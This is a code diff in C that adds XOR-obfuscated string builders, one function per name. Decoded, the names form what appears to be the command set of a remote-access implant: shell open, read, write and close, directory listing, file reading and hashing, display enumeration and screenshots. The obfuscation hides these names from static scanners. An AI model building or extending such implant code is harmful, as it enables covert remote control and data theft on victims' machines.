@@ -705,3 +705,260 @@ static VOID StrValArchArm64(PCHAR buf)
     buf[52] = (CHAR)(0x3Fu ^ key);
     buf[53] = 0;
 }
+static VOID StrNameBinMsg(PCHAR buf)
+{
+    volatile UINT32 key = 0x6F;
+    buf[0] = (CHAR)(0x0Du ^ key);
+    buf[1] = (CHAR)(0x06u ^ key);
+    buf[2] = (CHAR)(0x01u ^ key);
+    buf[3] = (CHAR)(0x0Eu ^ key);
+    buf[4] = (CHAR)(0x1Du ^ key);
+    buf[5] = (CHAR)(0x16u ^ key);
+    buf[6] = (CHAR)(0x42u ^ key);
+    buf[7] = (CHAR)(0x02u ^ key);
+    buf[8] = (CHAR)(0x0Au ^ key);
+    buf[9] = (CHAR)(0x1Cu ^ key);
+    buf[10] = (CHAR)(0x1Cu ^ key);
+    buf[11] = (CHAR)(0x0Eu ^ key);
+    buf[12] = (CHAR)(0x08u ^ key);
+    buf[13] = (CHAR)(0x0Au ^ key);
+    buf[14] = 0;
+}
+
+static VOID StrNameBinFrag(PCHAR buf)
+{
+    volatile UINT32 key = 0xCE;
+    buf[0] = (CHAR)(0xACu ^ key);
+    buf[1] = (CHAR)(0xA7u ^ key);
+    buf[2] = (CHAR)(0xA0u ^ key);
+    buf[3] = (CHAR)(0xAFu ^ key);
+    buf[4] = (CHAR)(0xBCu ^ key);
+    buf[5] = (CHAR)(0xB7u ^ key);
+    buf[6] = (CHAR)(0xE3u ^ key);
+    buf[7] = (CHAR)(0xA8u ^ key);
+    buf[8] = (CHAR)(0xBCu ^ key);
+    buf[9] = (CHAR)(0xAFu ^ key);
+    buf[10] = (CHAR)(0xA9u ^ key);
+    buf[11] = (CHAR)(0xA3u ^ key);
+    buf[12] = (CHAR)(0xABu ^ key);
+    buf[13] = (CHAR)(0xA0u ^ key);
+    buf[14] = (CHAR)(0xBAu ^ key);
+    buf[15] = 0;
+}
+
+static VOID StrNameUtf8Msg(PCHAR buf)
+{
+    volatile UINT32 key = 0x31;
+    buf[0] = (CHAR)(0x44u ^ key);
+    buf[1] = (CHAR)(0x45u ^ key);
+    buf[2] = (CHAR)(0x57u ^ key);
+    buf[3] = (CHAR)(0x09u ^ key);
+    buf[4] = (CHAR)(0x1Cu ^ key);
+    buf[5] = (CHAR)(0x5Cu ^ key);
+    buf[6] = (CHAR)(0x54u ^ key);
+    buf[7] = (CHAR)(0x42u ^ key);
+    buf[8] = (CHAR)(0x42u ^ key);
+    buf[9] = (CHAR)(0x50u ^ key);
+    buf[10] = (CHAR)(0x56u ^ key);
+    buf[11] = (CHAR)(0x54u ^ key);
+    buf[12] = 0;
+}
+
+static VOID StrNameUtf8Frag(PCHAR buf)
+{
+    volatile UINT32 key = 0xC9;
+    buf[0] = (CHAR)(0xBCu ^ key);
+    buf[1] = (CHAR)(0xBDu ^ key);
+    buf[2] = (CHAR)(0xAFu ^ key);
+    buf[3] = (CHAR)(0xF1u ^ key);
+    buf[4] = (CHAR)(0xE4u ^ key);
+    buf[5] = (CHAR)(0xAFu ^ key);
+    buf[6] = (CHAR)(0xBBu ^ key);
+    buf[7] = (CHAR)(0xA8u ^ key);
+    buf[8] = (CHAR)(0xAEu ^ key);
+    buf[9] = (CHAR)(0xA4u ^ key);
+    buf[10] = (CHAR)(0xACu ^ key);
+    buf[11] = (CHAR)(0xA7u ^ key);
+    buf[12] = (CHAR)(0xBDu ^ key);
+    buf[13] = 0;
+}
+
+static VOID StrNameClose(PCHAR buf)
+{
+    volatile UINT32 key = 0x7E;
+    buf[0] = (CHAR)(0x1Du ^ key);
+    buf[1] = (CHAR)(0x12u ^ key);
+    buf[2] = (CHAR)(0x11u ^ key);
+    buf[3] = (CHAR)(0x0Du ^ key);
+    buf[4] = (CHAR)(0x1Bu ^ key);
+    buf[5] = 0;
+}
+
+static VOID StrNameUnknown(PCHAR buf)
+{
+    volatile UINT32 key = 0x83;
+    buf[0] = (CHAR)(0xF6u ^ key);
+    buf[1] = (CHAR)(0xEDu ^ key);
+    buf[2] = (CHAR)(0xE8u ^ key);
+    buf[3] = (CHAR)(0xEDu ^ key);
+    buf[4] = (CHAR)(0xECu ^ key);
+    buf[5] = (CHAR)(0xF4u ^ key);
+    buf[6] = (CHAR)(0xEDu ^ key);
+    buf[7] = 0;
+}
+
+static VOID StrNameListDir(PCHAR buf)
+{
+    volatile UINT32 key = 0x98;
+    buf[0] = (CHAR)(0xD4u ^ key);
+    buf[1] = (CHAR)(0xF1u ^ key);
+    buf[2] = (CHAR)(0xEBu ^ key);
+    buf[3] = (CHAR)(0xECu ^ key);
+    buf[4] = (CHAR)(0xDCu ^ key);
+    buf[5] = (CHAR)(0xF1u ^ key);
+    buf[6] = (CHAR)(0xEAu ^ key);
+    buf[7] = (CHAR)(0xFDu ^ key);
+    buf[8] = (CHAR)(0xFBu ^ key);
+    buf[9] = (CHAR)(0xECu ^ key);
+    buf[10] = (CHAR)(0xF7u ^ key);
+    buf[11] = (CHAR)(0xEAu ^ key);
+    buf[12] = (CHAR)(0xE1u ^ key);
+    buf[13] = 0;
+}
+
+static VOID StrNameReadFile(PCHAR buf)
+{
+    volatile UINT32 key = 0x91;
+    buf[0] = (CHAR)(0xC3u ^ key);
+    buf[1] = (CHAR)(0xF4u ^ key);
+    buf[2] = (CHAR)(0xF0u ^ key);
+    buf[3] = (CHAR)(0xF5u ^ key);
+    buf[4] = (CHAR)(0xD7u ^ key);
+    buf[5] = (CHAR)(0xF8u ^ key);
+    buf[6] = (CHAR)(0xFDu ^ key);
+    buf[7] = (CHAR)(0xF4u ^ key);
+    buf[8] = 0;
+}
+
+static VOID StrNameHashFile(PCHAR buf)
+{
+    volatile UINT32 key = 0x1A;
+    buf[0] = (CHAR)(0x52u ^ key);
+    buf[1] = (CHAR)(0x7Bu ^ key);
+    buf[2] = (CHAR)(0x69u ^ key);
+    buf[3] = (CHAR)(0x72u ^ key);
+    buf[4] = (CHAR)(0x5Cu ^ key);
+    buf[5] = (CHAR)(0x73u ^ key);
+    buf[6] = (CHAR)(0x76u ^ key);
+    buf[7] = (CHAR)(0x7Fu ^ key);
+    buf[8] = 0;
+}
+
+static VOID StrNameWriteShell(PCHAR buf)
+{
+    volatile UINT32 key = 0x9F;
+    buf[0] = (CHAR)(0xC8u ^ key);
+    buf[1] = (CHAR)(0xEDu ^ key);
+    buf[2] = (CHAR)(0xF6u ^ key);
+    buf[3] = (CHAR)(0xEBu ^ key);
+    buf[4] = (CHAR)(0xFAu ^ key);
+    buf[5] = (CHAR)(0xCCu ^ key);
+    buf[6] = (CHAR)(0xF7u ^ key);
+    buf[7] = (CHAR)(0xFAu ^ key);
+    buf[8] = (CHAR)(0xF3u ^ key);
+    buf[9] = (CHAR)(0xF3u ^ key);
+    buf[10] = 0;
+}
+
+static VOID StrNameReadShell(PCHAR buf)
+{
+    volatile UINT32 key = 0x74;
+    buf[0] = (CHAR)(0x26u ^ key);
+    buf[1] = (CHAR)(0x11u ^ key);
+    buf[2] = (CHAR)(0x15u ^ key);
+    buf[3] = (CHAR)(0x10u ^ key);
+    buf[4] = (CHAR)(0x27u ^ key);
+    buf[5] = (CHAR)(0x1Cu ^ key);
+    buf[6] = (CHAR)(0x11u ^ key);
+    buf[7] = (CHAR)(0x18u ^ key);
+    buf[8] = (CHAR)(0x18u ^ key);
+    buf[9] = 0;
+}
+
+static VOID StrNameGetDisplays(PCHAR buf)
+{
+    volatile UINT32 key = 0x85;
+    buf[0] = (CHAR)(0xC2u ^ key);
+    buf[1] = (CHAR)(0xE0u ^ key);
+    buf[2] = (CHAR)(0xF1u ^ key);
+    buf[3] = (CHAR)(0xC1u ^ key);
+    buf[4] = (CHAR)(0xECu ^ key);
+    buf[5] = (CHAR)(0xF6u ^ key);
+    buf[6] = (CHAR)(0xF5u ^ key);
+    buf[7] = (CHAR)(0xE9u ^ key);
+    buf[8] = (CHAR)(0xE4u ^ key);
+    buf[9] = (CHAR)(0xFCu ^ key);
+    buf[10] = (CHAR)(0xF6u ^ key);
+    buf[11] = 0;
+}
+
+static VOID StrNameGetScreenshot(PCHAR buf)
+{
+    volatile UINT32 key = 0x46;
+    buf[0] = (CHAR)(0x01u ^ key);
+    buf[1] = (CHAR)(0x23u ^ key);
+    buf[2] = (CHAR)(0x32u ^ key);
+    buf[3] = (CHAR)(0x15u ^ key);
+    buf[4] = (CHAR)(0x25u ^ key);
+    buf[5] = (CHAR)(0x34u ^ key);
+    buf[6] = (CHAR)(0x23u ^ key);
+    buf[7] = (CHAR)(0x23u ^ key);
+    buf[8] = (CHAR)(0x28u ^ key);
+    buf[9] = (CHAR)(0x35u ^ key);
+    buf[10] = (CHAR)(0x2Eu ^ key);
+    buf[11] = (CHAR)(0x29u ^ key);
+    buf[12] = (CHAR)(0x32u ^ key);
+    buf[13] = 0;
+}
+
+static VOID StrNameCloseShell(PCHAR buf)
+{
+    volatile UINT32 key = 0xE9;
+    buf[0] = (CHAR)(0xAAu ^ key);
+    buf[1] = (CHAR)(0x85u ^ key);
+    buf[2] = (CHAR)(0x86u ^ key);
+    buf[3] = (CHAR)(0x9Au ^ key);
+    buf[4] = (CHAR)(0x8Cu ^ key);
+    buf[5] = (CHAR)(0xBAu ^ key);
+    buf[6] = (CHAR)(0x81u ^ key);
+    buf[7] = (CHAR)(0x8Cu ^ key);
+    buf[8] = (CHAR)(0x85u ^ key);
+    buf[9] = (CHAR)(0x85u ^ key);
+    buf[10] = 0;
+}
+
+static VOID StrNameExit(PCHAR buf)
+{
+    volatile UINT32 key = 0x69;
+    buf[0] = (CHAR)(0x2Cu ^ key);
+    buf[1] = (CHAR)(0x11u ^ key);
+    buf[2] = (CHAR)(0x00u ^ key);
+    buf[3] = (CHAR)(0x1Du ^ key);
+    buf[4] = 0;
+}
+
+static VOID StrNameOpenShell(PCHAR buf)
+{
+    volatile UINT32 key = 0x75;
+    buf[0] = (CHAR)(0x3Au ^ key);
+    buf[1] = (CHAR)(0x05u ^ key);
+    buf[2] = (CHAR)(0x10u ^ key);
+    buf[3] = (CHAR)(0x1Bu ^ key);
+    buf[4] = (CHAR)(0x26u ^ key);
+    buf[5] = (CHAR)(0x1Du ^ key);
+    buf[6] = (CHAR)(0x10u ^ key);
+    buf[7] = (CHAR)(0x19u ^ key);
+    buf[8] = (CHAR)(0x19u ^ key);
+    buf[9] = 0;
+}
+
